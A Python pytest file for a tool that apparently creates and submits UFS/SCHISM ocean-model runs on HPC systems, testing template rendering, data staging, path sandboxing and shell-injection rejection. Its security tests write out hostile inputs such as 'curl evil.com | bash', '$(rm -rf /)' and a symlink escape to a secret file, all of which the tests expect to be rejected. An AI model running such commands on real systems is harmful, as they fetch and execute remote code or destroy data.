"""Unit tests for UfsRunner core logic."""

import json
import pytest
from pathlib import Path

from ufs_runner_mcp.runner import RunnerError
from ufs_runner_mcp.models import (
    validate_job_id,
    validate_path,
    validate_run_dir,
    validate_shell_safe_values,
)


class TestModels:
    """Test validation helpers."""

    def test_validate_run_dir_allowed(self, monkeypatch):
        monkeypatch.setenv("UFS_RUNNER_ALLOWED_PATHS", "/tmp/test")
        assert validate_run_dir("/tmp/test/myrun") is None

    def test_validate_run_dir_blocked(self):
        result = validate_run_dir("/home/user/run")
        assert result is not None
        assert "not under an allowed path" in result

    def test_validate_run_dir_scratch_allowed(self):
        assert validate_run_dir("/scratch/user/run") is None

    def test_validate_job_id_valid(self):
        assert validate_job_id("12345") is None

    def test_validate_job_id_invalid(self):
        assert validate_job_id("abc") is not None
        assert validate_job_id("12 34") is not None
        assert validate_job_id("") is not None


class TestCreateExperiment:
    """Test experiment creation."""

    def test_create_schism_default(self, runner, tmp_path):
        run_dir = str(tmp_path / "schism_test")
        result = runner.create_experiment(model_type="schism", run_dir=run_dir)

        assert result["status"] == "created"
        assert result["model_type"] == "schism"
        assert "param.nml" in result["files"]
        assert "model_configure" in result["files"]
        assert "run_ufs.sh" in result["files"]

    def test_create_writes_metadata(self, runner, tmp_path):
        run_dir = str(tmp_path / "meta_test")
        runner.create_experiment(model_type="schism", run_dir=run_dir)

        meta_file = Path(run_dir) / ".ufs_experiment.json"
        assert meta_file.exists()
        meta = json.loads(meta_file.read_text())
        assert meta["model_type"] == "schism"
        assert meta["status"] == "created"

    def test_create_rejects_bad_model(self, runner, tmp_path):
        with pytest.raises(RunnerError, match="Unknown model_type"):
            runner.create_experiment(model_type="invalid", run_dir=str(tmp_path / "x"))

    def test_create_rejects_bad_path(self, runner):
        with pytest.raises(RunnerError, match="not under an allowed path"):
            runner.create_experiment(model_type="schism", run_dir="/home/nope/run")

    def test_create_rejects_nonempty_dir(self, runner, tmp_path):
        run_dir = tmp_path / "nonempty"
        run_dir.mkdir()
        (run_dir / "existing_file.txt").write_text("data")

        with pytest.raises(RunnerError, match="not empty"):
            runner.create_experiment(model_type="schism", run_dir=str(run_dir))

    def test_create_with_overrides(self, runner, tmp_path):
        run_dir = str(tmp_path / "override_test")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"CORE": {"dt": 60.0, "rnday": 3.0}},
        )

        import f90nml

        nml = f90nml.read(str(Path(run_dir) / "param.nml"))
        assert nml["CORE"]["dt"] == 60.0
        assert nml["CORE"]["rnday"] == 3.0

    def test_template_rendering_model_configure(self, runner, tmp_path):
        """Template variables are substituted in generated config files."""
        run_dir = str(tmp_path / "render_test")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={
                "start_year": 2024,
                "start_month": 3,
                "start_day": 15,
                "nhours_fcst": 12,
            },
        )
        content = (Path(run_dir) / "model_configure").read_text()
        assert "start_year:              2024" in content
        assert "start_month:             3" in content
        assert "start_day:               15" in content
        assert "nhours_fcst:             12" in content

    def test_template_rendering_ufs_configure(self, runner, tmp_path):
        """Task distribution variables are computed and rendered."""
        run_dir = str(tmp_path / "tasks_test")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"atm_tasks": 80, "ocn_tasks": 80},
        )
        content = (Path(run_dir) / "ufs.configure").read_text()
        assert "ATM_petlist_bounds:             0 79" in content
        assert "OCN_petlist_bounds:             80 159" in content

    def test_template_rendering_run_script(self, runner, tmp_path):
        """Slurm parameters are rendered in run script."""
        run_dir = str(tmp_path / "slurm_test")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={
                "nodes": 8,
                "tasks_per_node": 40,
                "total_tasks": 320,
                "job_name": "my-run",
            },
        )
        content = (Path(run_dir) / "run_ufs.sh").read_text()
        assert "#SBATCH --nodes=8" in content
        assert "#SBATCH --ntasks-per-node=40" in content
        assert "#SBATCH --job-name=my-run" in content
        assert "srun --label -n 320" in content

    def test_metadata_includes_resolved_variables(self, runner, tmp_path):
        """Experiment metadata records resolved template variables."""
        run_dir = str(tmp_path / "meta_vars_test")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"start_year": 2025},
        )
        meta = json.loads((Path(run_dir) / ".ufs_experiment.json").read_text())
        assert "resolved_variables" in meta
        assert meta["resolved_variables"]["start_year"] == 2025

    def test_create_nonexistent_template(self, runner, tmp_path):
        with pytest.raises(RunnerError, match="Template.*not found"):
            runner.create_experiment(
                model_type="schism",
                run_dir=str(tmp_path / "x"),
                template="does_not_exist",
            )

    def test_rejects_shell_injection_in_output_dir(self, runner, tmp_path):
        """Template variables used in shell contexts must be sanitized."""
        with pytest.raises(RunnerError, match="Unsafe value"):
            runner.create_experiment(
                model_type="schism",
                run_dir=str(tmp_path / "inject"),
                overrides={"output_dir": "x; curl evil.com | bash"},
            )

    def test_rejects_shell_injection_in_job_name(self, runner, tmp_path):
        with pytest.raises(RunnerError, match="Unsafe value"):
            runner.create_experiment(
                model_type="schism",
                run_dir=str(tmp_path / "inject2"),
                overrides={"job_name": "test$(whoami)"},
            )

    def test_safe_shell_values_accepted(self, runner, tmp_path):
        """Normal values with dots, slashes, hyphens should pass."""
        run_dir = str(tmp_path / "safe_vals")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"output_dir": "outputs/run-1", "job_name": "my_run.v2"},
        )
        assert result["status"] == "created"

    def test_user_total_tasks_respected(self, runner, tmp_path):
        """User-provided total_tasks should not be overwritten."""
        run_dir = str(tmp_path / "user_total")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"atm_tasks": 80, "ocn_tasks": 80, "total_tasks": 400},
        )
        content = (Path(run_dir) / "run_ufs.sh").read_text()
        assert "srun --label -n 400" in content

    def test_datm_in_template_rendering(self, runner, tmp_path):
        """datm_in template variables are rendered correctly."""
        run_dir = str(tmp_path / "datm_render")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"datm_datamode": "CORE2_NYF", "datm_nx": 720, "datm_ny": 361},
        )
        content = (Path(run_dir) / "datm_in").read_text()
        assert 'datamode = "CORE2_NYF"' in content
        assert "nx_global = 720" in content
        assert "ny_global = 361" in content


class TestOverrideHonesty:
    """Fix 2: documented flat/namelist overrides that silently no-op must
    be reported back, not hidden behind a claimed 'Experiment Created'."""

    def test_matched_flat_override_no_warning(self, runner, tmp_path):
        """An override with a real {{placeholder}} succeeds as before —
        no warning is raised."""
        run_dir = str(tmp_path / "matched_flat")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"start_year": 2030},
        )
        warnings = result["override_warnings"]
        assert warnings["unmatched_flat_keys"] == []
        assert warnings["unmatched_namelist_groups"] == []
        assert warnings["namelist_write_failures"] == []
        content = (Path(run_dir) / "model_configure").read_text()
        assert "2030" in content

    def test_unmatched_flat_override_warns(self, runner, tmp_path):
        """dt_ocean is documented (defaults.yaml) as an overridable flat
        key, but no template file has a {{dt_ocean}} placeholder — the
        override must be reported as having no effect."""
        run_dir = str(tmp_path / "unmatched_flat")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"dt_ocean": 5.0, "start_year": 2031},
        )
        unmatched = result["override_warnings"]["unmatched_flat_keys"]
        assert "dt_ocean" in unmatched
        assert "start_year" not in unmatched

    def test_ocn_tasks_override_alone_no_warning(self, runner, tmp_path):
        """ocn_tasks never appears as a literal {{ocn_tasks}} placeholder —
        it only feeds _compute_derived_vars (OCN_petlist_bounds via
        total_tasks_minus1, the srun task count via total_tasks). Overriding
        it alone is a real, working override (it changes the rendered
        output) and must NOT be reported as having no effect."""
        run_dir = str(tmp_path / "ocn_tasks_only")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"ocn_tasks": 80},
        )
        unmatched = result["override_warnings"]["unmatched_flat_keys"]
        assert "ocn_tasks" not in unmatched
        # sanity: the override did actually change the rendered output
        content = (Path(run_dir) / "ufs.configure").read_text()
        assert "OCN_petlist_bounds:             160 239" in content

    def test_matched_namelist_group_override_no_warning(self, runner, tmp_path):
        """A nested override whose group exists in a real namelist file
        succeeds silently, same as before this fix."""
        run_dir = str(tmp_path / "matched_group")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"CORE": {"dt": 60.0, "rnday": 3.0}},
        )
        warnings = result["override_warnings"]
        assert warnings["unmatched_namelist_groups"] == []
        assert warnings["namelist_write_failures"] == []

    def test_unmatched_namelist_group_warns(self, runner, tmp_path):
        """A nested override group that matches no namelist file's groups
        must be reported, not silently dropped."""
        run_dir = str(tmp_path / "unmatched_group")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"NO_SUCH_GROUP": {"foo": 1}},
        )
        unmatched = result["override_warnings"]["unmatched_namelist_groups"]
        assert "NO_SUCH_GROUP" in unmatched

    def test_namelist_write_failure_surfaces_as_warning(
        self, runner, tmp_path, monkeypatch
    ):
        """If _apply_overrides can't even read/write a namelist file, that
        must show up in the tool output, not just a log-only warning."""
        import ufs_runner_mcp.runner as runner_module

        def boom(_path):
            raise ValueError("corrupt namelist")

        monkeypatch.setattr(runner_module.f90nml, "read", boom)

        run_dir = str(tmp_path / "nml_fail")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            overrides={"CORE": {"dt": 99.0}},
        )
        warnings = result["override_warnings"]
        assert len(warnings["namelist_write_failures"]) >= 1
        failed_names = {f["file"] for f in warnings["namelist_write_failures"]}
        assert "param.nml" in failed_names
        # The read blew up before any group could be applied anywhere, so
        # the group is also (correctly) reported as unmatched.
        assert "CORE" in warnings["unmatched_namelist_groups"]


class TestStageInputData:
    """Test input data staging from user directories."""

    def _make_input_dir(self, tmp_path):
        """Create a fake input directory with typical SCHISM files."""
        input_dir = tmp_path / "input_data"
        input_dir.mkdir()
        # Mesh files
        (input_dir / "hgrid.gr3").write_text("mesh data")
        (input_dir / "hgrid.ll").write_text("mesh ll")
        (input_dir / "vgrid.in").write_text("vgrid data")
        # Friction / diffusivity
        (input_dir / "rough.gr3").write_text("rough")
        (input_dir / "drag.gr3").write_text("drag")
        (input_dir / "diffmin.gr3").write_text("diffmin")
        (input_dir / "diffmax.gr3").write_text("diffmax")
        (input_dir / "windrot_geo2proj.gr3").write_text("windrot")
        # Initial conditions
        (input_dir / "elev.ic").write_text("elev ic")
        # Forcing
        (input_dir / "elev2D.th.nc").write_bytes(b"fake nc")
        # INPUT subdirectory
        inp = input_dir / "INPUT"
        inp.mkdir()
        (inp / "era5_data.nc").write_bytes(b"era5")
        (inp / "era5_SCRIP_ESMF.nc").write_bytes(b"scrip")
        # Executable
        (input_dir / "ufs_model").write_bytes(b"ELF")
        (input_dir / "module-setup.sh").write_text("#!/bin/bash")
        mods = input_dir / "modulefiles"
        mods.mkdir()
        (mods / "modules.fv3").write_text("module load fv3")
        return input_dir

    def test_stage_copies_mesh_files(self, runner, tmp_path):
        input_dir = self._make_input_dir(tmp_path)
        run_dir = str(tmp_path / "staged_run")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            input_data_dir=str(input_dir),
        )
        staged = result["staged_files"]
        assert "hgrid.gr3" in staged
        assert "hgrid.ll" in staged
        assert "drag.gr3" in staged
        assert Path(run_dir, "hgrid.gr3").exists()

    def test_stage_copies_input_subdir(self, runner, tmp_path):
        input_dir = self._make_input_dir(tmp_path)
        run_dir = str(tmp_path / "staged_input")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            input_data_dir=str(input_dir),
        )
        staged = result["staged_files"]
        # INPUT/ files should be staged
        input_files = [f for f in staged if f.startswith("INPUT/")]
        assert len(input_files) >= 2
        assert Path(run_dir, "INPUT", "era5_data.nc").exists()

    def test_stage_copies_executables(self, runner, tmp_path):
        input_dir = self._make_input_dir(tmp_path)
        run_dir = str(tmp_path / "staged_exec")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            input_data_dir=str(input_dir),
        )
        staged = result["staged_files"]
        assert "ufs_model" in staged
        assert "module-setup.sh" in staged
        assert any("modulefiles" in f for f in staged)

    def test_domain_files_override_template_stubs(self, runner, tmp_path):
        """Domain-specific files from input_dir should replace template stubs."""
        input_dir = self._make_input_dir(tmp_path)
        (input_dir / "bctides.in").write_text("REAL DOMAIN BCTIDES")
        (input_dir / "station.in").write_text("REAL DOMAIN STATIONS")
        run_dir = str(tmp_path / "domain_override")
        result = runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            input_data_dir=str(input_dir),
        )
        staged = result["staged_files"]
        assert "bctides.in" in staged
        assert "station.in" in staged
        # User's version should have replaced the template stub
        assert (Path(run_dir) / "bctides.in").read_text() == "REAL DOMAIN BCTIDES"
        assert (Path(run_dir) / "station.in").read_text() == "REAL DOMAIN STATIONS"

    def test_non_domain_template_files_not_overwritten(self, runner, tmp_path):
        """Non-domain template files (configs) should not be overwritten."""
        input_dir = self._make_input_dir(tmp_path)
        (input_dir / "param.nml").write_text("SHOULD NOT REPLACE")
        run_dir = str(tmp_path / "no_config_overwrite")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            input_data_dir=str(input_dir),
        )
        content = (Path(run_dir) / "param.nml").read_text()
        assert content != "SHOULD NOT REPLACE"

    def test_stage_records_in_metadata(self, runner, tmp_path):
        input_dir = self._make_input_dir(tmp_path)
        run_dir = str(tmp_path / "meta_stage")
        runner.create_experiment(
            model_type="schism",
            run_dir=run_dir,
            input_data_dir=str(input_dir),
        )
        meta = json.loads((Path(run_dir) / ".ufs_experiment.json").read_text())
        assert meta["input_data_dir"] == str(input_dir)
        assert len(meta["staged_files"]) > 0

    def test_stage_rejects_nonexistent_dir(self, runner, tmp_path):
        with pytest.raises(RunnerError, match="does not exist"):
            runner.create_experiment(
                model_type="schism",
                run_dir=str(tmp_path / "bad_stage"),
                input_data_dir=str(tmp_path / "nope"),
            )

    def test_stage_rejects_disallowed_path(self, runner, tmp_path):
        """input_data_dir must be under an allowed path prefix."""
        with pytest.raises(RunnerError, match="not under an allowed path"):
            runner.create_experiment(
                model_type="schism",
                run_dir=str(tmp_path / "safe_run"),
                input_data_dir="/etc/passwd/../secrets",
            )

    def test_stage_no_data_dir(self, runner, tmp_path):
        """Without input_data_dir, staged_files should be empty."""
        run_dir = str(tmp_path / "no_stage")
        result = runner.create_experiment(model_type="schism", run_dir=run_dir)
        assert result["staged_files"] == []


class TestValidateExperiment:
    """Test experiment validation."""

    def test_validate_valid_experiment(self, runner, schism_run_dir):
        result = runner.validate_experiment(schism_run_dir)
        # Will have errors for missing hgrid.gr3 etc, but should not crash
        assert result["model_type"] == "schism"
        assert isinstance(result["errors"], list)

    def test_validate_nonexistent_dir(self, runner, tmp_path, monkeypatch):
        monkeypatch.setenv("UFS_RUNNER_ALLOWED_PATHS", str(tmp_path))
        with pytest.raises(RunnerError, match="does not exist"):
            runner.validate_experiment(str(tmp_path / "nope"))

    def test_validate_finds_missing_files(self, runner, schism_run_dir):
        result = runner.validate_experiment(schism_run_dir)
        missing = [e["message"] for e in result["errors"]]
        # hgrid.gr3, vgrid.in, drag.gr3 are not in the template
        assert any("hgrid.gr3" in m for m in missing)


class TestSubmitExperiment:
    """Test experiment submission (dry-run only in tests)."""

    def test_dry_run(self, runner, schism_run_dir):
        result = runner.submit_experiment(
            run_dir=schism_run_dir,
            account="coastal-act",
            partition="compute",
            nodes=2,
            wall_hours=4,
            dry_run=True,
        )
        assert result["mode"] == "dry_run"
        assert "sbatch" in result["command"]
        assert "--nodes=2" in result["command"]
        assert "--account=coastal-act" in result["command"]

    def test_rejects_too_many_nodes(self, runner, schism_run_dir):
        with pytest.raises(RunnerError, match="exceeds limit"):
            runner.submit_experiment(
                run_dir=schism_run_dir,
                account="test",
                partition="compute",
                nodes=100,
                dry_run=True,
            )

    def test_rejects_too_long_wall(self, runner, schism_run_dir):
        with pytest.raises(RunnerError, match="exceeds limit"):
            runner.submit_experiment(
                run_dir=schism_run_dir,
                account="test",
                partition="compute",
                wall_hours=24,
                dry_run=True,
            )

    def test_rejects_bad_account(self, runner, schism_run_dir):
        with pytest.raises(RunnerError, match="Invalid account"):
            runner.submit_experiment(
                run_dir=schism_run_dir,
                account="bad; rm -rf /",
                partition="compute",
                dry_run=True,
            )


class TestCollectOutputs:
    """Test output collection."""

    def test_empty_dir(self, runner, schism_run_dir):
        result = runner.collect_outputs(schism_run_dir)
        # Template has .nml and .sh but no .nc or .out yet
        assert isinstance(result["outputs"], list)

    def test_finds_netcdf(self, runner, schism_run_dir):
        # Create a fake output
        (Path(schism_run_dir) / "output.nc").write_bytes(b"fake")
        result = runner.collect_outputs(schism_run_dir)
        paths = [o["path"] for o in result["outputs"]]
        assert "output.nc" in paths

    def test_slurm_log_not_double_counted(self, runner, schism_run_dir):
        """slurm-<jobid>.out matches the general '*.out' pattern; it must
        not also be picked up by a redundant explicit 'slurm-*.out' glob
        and counted/listed twice."""
        (Path(schism_run_dir) / "slurm-12345.out").write_text("log contents")
        result = runner.collect_outputs(schism_run_dir)
        paths = [o["path"] for o in result["outputs"]]
        assert paths.count("slurm-12345.out") == 1
        assert result["output_count"] == len(result["outputs"])

    def test_symlinked_output_not_merged_with_its_target(self, runner, schism_run_dir):
        """latest.nc -> history.nc is a common UFS pattern: two distinct,
        both-meaningful directory entries pointing at the same file. Dedup
        must key on the directory entry, not the resolved inode, or one of
        the two gets silently dropped from the listing."""
        run_path = Path(schism_run_dir)
        (run_path / "history.nc").write_bytes(b"real output data")
        (run_path / "latest.nc").symlink_to(run_path / "history.nc")

        result = runner.collect_outputs(schism_run_dir)
        paths = [o["path"] for o in result["outputs"]]
        assert "history.nc" in paths
        assert "latest.nc" in paths
        assert result["output_count"] == len(result["outputs"])


class TestSecurityHardening:
    """Regression tests for the three sandbox-escape / injection fixes."""

    # --- Fix 1: path-prefix boundary (was a full sandbox escape) ---

    @pytest.mark.parametrize(
        "bad",
        [
            "/work-attacker/run",
            "/workshop/evil",
            "/scratchpad-evil/x",
            "/scratch_evil/x",
            "/contrib-malicious/a",
        ],
    )
    def test_validate_path_rejects_prefix_sibling(self, bad):
        """A dir that merely shares the string prefix is NOT under it."""
        assert validate_path(bad) is not None

    def test_validate_path_allows_genuine_descendants(self):
        """Real descendants of an allowed prefix are still accepted."""
        assert validate_path("/scratch/user/run") is None
        assert validate_path("/work/user/run") is None

    def test_validate_path_env_prefix_boundary(self, monkeypatch, tmp_path):
        """Env-supplied prefixes get the same boundary treatment."""
        monkeypatch.setenv("UFS_RUNNER_ALLOWED_PATHS", str(tmp_path))
        assert validate_path(str(tmp_path / "run")) is None
        assert validate_path(str(tmp_path) + "-evil/run") is not None

    # --- Fix 1: numbered RDHPCS mounts (/scratch3, /work2/noaa, ...) ---

    def test_validate_path_numbered_scratch_mount_accepted(self):
        """Real RDHPCS mounts like /scratch5 must be accepted, not just /scratch."""
        assert validate_path("/scratch5/user/run") is None

    def test_validate_path_numbered_work_mount_with_subdir_accepted(self):
        assert validate_path("/work2/noaa/project") is None

    def test_validate_path_numbered_contrib_mount_accepted(self):
        assert validate_path("/contrib3/x") is None

    def test_validate_path_work_attacker_still_rejected(self):
        """Numbered-mount leniency must not reopen the /work-attacker escape."""
        assert validate_path("/work-attacker") is not None
        assert validate_path("/work-attacker/run") is not None

    def test_validate_path_workfoo_still_rejected(self):
        """A non-digit suffix on the base name must still be rejected."""
        assert validate_path("/workfoo") is not None
        assert validate_path("/workfoo/run") is not None

    # --- Fix 1 follow-up: symlinked allowed roots must not be rejected ---

    def test_validate_path_symlinked_allowed_root_accepted(self, monkeypatch, tmp_path):
        """Real HPC sites symlink allowed roots (e.g. /work -> /lustre/work).

        The input path is resolved (collapsing the symlink) before checking,
        so the configured prefix must be resolved the same way, or a
        legitimately-allowed path through the symlink is wrongly rejected.
        """
        real_dir = tmp_path / "lustre_work"
        real_dir.mkdir()
        (real_dir / "myexperiment").mkdir()
        symlink_root = tmp_path / "work_symlink"
        symlink_root.symlink_to(real_dir)

        monkeypatch.setenv("UFS_RUNNER_ALLOWED_PATHS", str(symlink_root))
        assert validate_path(str(symlink_root / "myexperiment")) is None

    def test_validate_path_env_prefix_digit_leniency_only_first_component(
        self, monkeypatch, tmp_path
    ):
        """Digit-suffix leniency only applies to the component right after
        the filesystem root — it must not spread to deeper components of a
        custom, multi-component env-configured prefix."""
        prefix_dir = tmp_path / "myproj"
        monkeypatch.setenv("UFS_RUNNER_ALLOWED_PATHS", str(prefix_dir))
        # genuine descendant: still allowed
        assert validate_path(str(prefix_dir / "run")) is None
        # a sibling of the deep component "myproj" with a numeric suffix must
        # NOT be tolerated — only the root's immediate child gets leniency
        sibling = str(tmp_path) + "/myproj2/run"
        assert validate_path(sibling) is not None

    def test_validate_path_relative_env_prefix_resolved_against_cwd(
        self, monkeypatch, tmp_path
    ):
        """A relative UFS_RUNNER_ALLOWED_PATHS entry used to silently become
        a no-op; it must instead resolve against the current working
        directory, same as pathlib would naturally do."""
        (tmp_path / "relative_scratch").mkdir()
        monkeypatch.chdir(tmp_path)
        monkeypatch.setenv("UFS_RUNNER_ALLOWED_PATHS", "relative_scratch")
        assert validate_path(str(tmp_path / "relative_scratch" / "run")) is None

    def test_validate_path_root_prefix_does_not_allow_everything(self, monkeypatch):
        """UFS_RUNNER_ALLOWED_PATHS='/' must not silently become an allow-all
        (it would defeat the sandbox entirely) — it's dropped as a
        degenerate config value instead, leaving the built-in prefixes as
        the only effective ones."""
        monkeypatch.setenv("UFS_RUNNER_ALLOWED_PATHS", "/")
        assert validate_path("/etc/passwd") is not None
        assert validate_path("/home/user/run") is not None
        # built-ins are unaffected
        assert validate_path("/scratch/user/run") is None

    # --- Fix 3: every user override value must be shell-safe ---

    @pytest.mark.parametrize(
        "value",
        [
            "mpirun; curl http://evil/x | sh",
            "$(rm -rf /)",
            "`id`",
            "a && b",
            "x > /home/victim/.bashrc",
            "a|b",
        ],
    )
    def test_validate_shell_safe_values_blocks_metachars(self, value):
        """Arbitrary user overrides (not just the 7 known names) are checked."""
        result = validate_shell_safe_values({"mpi_cmd": value}, {"mpi_cmd"})
        assert result is not None and "Unsafe value for override" in result

    def test_validate_shell_safe_values_allows_safe(self):
        """Legitimate path/name/number values pass."""
        variables = {"exe_name": "ufs_model", "outdir": "/scratch/x/y-1.2"}
        assert validate_shell_safe_values(variables, {"exe_name", "outdir"}) is None

    def test_create_experiment_rejects_injection_override(self, runner, tmp_path):
        """An injected flat override is rejected before any script is written."""
        run_dir = str(tmp_path / "run")
        with pytest.raises(RunnerError, match="Unsafe value for override"):
            runner.create_experiment(
                model_type="schism",
                run_dir=run_dir,
                overrides={"evil_cmd": "x; rm -rf /"},
            )

    # --- Fix 2: symlink in input dir must not exfiltrate outside files ---

    def test_stage_input_data_skips_symlink_escaping_input_dir(self, runner, tmp_path):
        """A staged-pattern file that symlinks outside input_dir is skipped."""
        secret = tmp_path / "secret.txt"
        secret.write_text("TOP_SECRET_CREDENTIALS")
        input_dir = tmp_path / "indir"
        input_dir.mkdir()
        # bctides.in is a schism stage pattern; here it is a symlink escape.
        (input_dir / "bctides.in").symlink_to(secret)

        run_dir = tmp_path / "run"
        result = runner.create_experiment(
            model_type="schism",
            run_dir=str(run_dir),
            input_data_dir=str(input_dir),
        )

        assert "bctides.in" not in result.get("staged_files", [])
        # The secret content must not be readable anywhere under run_dir.
        leaked = any(
            "TOP_SECRET_CREDENTIALS" in p.read_text(errors="ignore")
            for p in run_dir.rglob("*")
            if p.is_file()
        )
        assert not leaked
